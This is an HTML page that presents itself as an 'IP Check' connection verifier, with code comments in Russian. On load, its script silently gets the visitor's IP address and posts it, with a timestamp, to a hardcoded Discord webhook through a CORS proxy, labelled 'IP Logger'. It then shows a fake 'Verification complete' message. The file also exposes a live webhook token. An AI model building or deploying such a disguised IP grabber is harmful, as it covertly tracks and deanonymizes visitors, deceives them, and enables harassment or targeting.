<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>IP Check</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Checking your connection...</h1>
        <p id="status">Please wait</p>
    </div>

    <script>
        // Получаем IP через сторонний сервис
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // Отправка в Discord через CORS-прокси
        async function sendToDiscord(ip) {
            const webhookURL = 'https://discord.com/api/webhooks/1338244151417901086/NB_mQmzK15E3xIcHD5kMZMS5Dye_FdhPTgmqbL8mx0ESpB10qmrxfJWFSP0bLnk2E1rX';
            const proxyURL = 'https://cors-anywhere.herokuapp.com/';
            
            const payload = {
                content: `New visit!\nIP: ${ip}\nTime: ${new Date().toLocaleString()}`,
                username: "IP Logger"
            };

            try {
                await fetch(proxyURL + webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Origin': window.location.origin
                    },
                    body: JSON.stringify(payload)
                });
                document.getElementById('status').textContent = 'Verification complete!';
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('status').textContent = 'Connection verified';
            }
        }

        // Основной поток
        (async () => {
            const ip = await getIP();
            await sendToDiscord(ip);
        })();
    </script>
</body>
</html>
